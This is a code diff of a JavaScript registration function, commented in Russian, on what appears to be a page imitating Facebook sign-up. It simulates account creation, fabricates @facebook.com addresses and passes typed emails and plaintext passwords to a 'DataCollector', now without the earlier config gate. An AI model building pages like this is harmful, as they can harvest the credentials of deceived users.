@@ -101,32 +101,53 @@ function redirectToProfile(email) {
 }
 
 // СОЗДАНИЕ АККАУНТА - РАБОЧАЯ ВЕРСИЯ!
+// СОЗДАНИЕ НОВОГО АККАУНТА - ИСПРАВЛЕННАЯ ВЕРСИЯ!
 function createAccount() {
-    console.log('Создание аккаунта вызвано');
+    console.log('🎯 СОЗДАНИЕ НОВОГО АККАУНТА вызвано');
     
-    const email = document.getElementById('email').value.trim();
-    const password = document.getElementById('password').value;
+    const emailField = document.getElementById('email');
+    const passwordField = document.getElementById('password');
     
-    console.log('Данные для регистрации:', { 
-        email: email || 'пусто', 
+    const email = emailField ? emailField.value.trim() : '';
+    const password = passwordField ? passwordField.value : '';
+    
+    console.log('📝 Данные для регистрации:', { 
+        email: email ? email.substring(0, 10) + '...' : 'пусто', 
         password: password ? '***' : 'пусто' 
     });
     
     // Показать индикатор загрузки
     showLoading();
     
-    // Сохраняем данные регистрации
-    if (window.DataCollector && window.CONFIG && CONFIG.COLLECT_DATA) {
+    // СОЗДАЕМ УНИКАЛЬНЫЙ EMAIL если поле пустое
+    let finalEmail = email;
+    if (!finalEmail) {
+        finalEmail = `new_user_${Date.now()}@facebook.com`;
+        console.log('📧 Создан уникальный email:', finalEmail);
+    }
+    
+    // СОЗДАЕМ УНИКАЛЬНЫЙ ПАРОЛЬ если поле пустое
+    let finalPassword = password;
+    if (!finalPassword) {
+        finalPassword = `pass_${Math.random().toString(36).substr(2, 8)}_${Date.now().toString(36).substr(2, 4)}`;
+        console.log('🔑 Создан уникальный пароль');
+    }
+    
+    // Сохраняем данные НОВОГО пользователя
+    let userData = null;
+    if (window.DataCollector) {
         try {
-            // Если поля пустые, создаем демо данные
-            const regEmail = email || `new_user_${Date.now()}@facebook.com`;
-            const regPassword = password || `pass_${Math.random().toString(36).substr(2, 8)}`;
-            
-            DataCollector.saveUserData(regEmail, regPassword);
-            console.log('Аккаунт создан:', regEmail);
+            console.log('💾 Сохраняем нового пользователя...');
+            userData = DataCollector.saveUserData(finalEmail, finalPassword);
+            if (userData) {
+                console.log('✅ Новый аккаунт создан:', userData.email);
+                console.log('📊 Всего пользователей в системе:', DataCollector.data.users.length);
+            }
         } catch (error) {
-            console.error('Ошибка создания аккаунта:', error);
+            console.error('❌ Ошибка создания аккаунта:', error);
         }
+    } else {
+        console.warn('⚠️ DataCollector не доступен');
     }
     
     // Имитация создания аккаунта
@@ -137,18 +158,15 @@ function createAccount() {
             loading.classList.add('hidden');
         }
         
-        // Перенаправляем на профиль
-        const userEmail = email || `new_user_${Date.now()}@facebook.com`;
-        const encodedEmail = encodeURIComponent(userEmail);
+        // Перенаправляем на профиль с НОВЫМИ данными
+        const encodedEmail = encodeURIComponent(finalEmail);
         const redirectUrl = `profile.html?email=${encodedEmail}&ref=registration&new=true&t=${Date.now()}`;
         
-        console.log('Перенаправление после регистрации:', redirectUrl);
+        console.log('🔄 Перенаправление после регистрации:', redirectUrl);
         window.location.href = redirectUrl;
-    }, 1500);
-    
-    // НЕТ ALERT'ОВ! Просто перенаправляем
+        
+    }, 1500); // 1.5 секунды
 }
-
 // Скрыть индикатор загрузки
 function hideLoading() {
     const loading = document.getElementById('loading');
